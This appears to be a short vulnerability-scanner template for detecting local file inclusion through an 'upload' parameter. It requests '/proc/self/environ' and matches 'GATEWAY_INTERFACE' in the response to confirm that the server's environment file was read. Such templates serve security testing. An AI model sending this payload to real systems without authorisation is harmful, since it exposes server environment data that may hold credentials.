id: lfi7-120
name: 'Deep traversal in upload'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via upload'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      upload:
        - '/proc/self/environ'
    matchers:
      - type: word
        part: body
        words:
          - 'GATEWAY_INTERFACE'
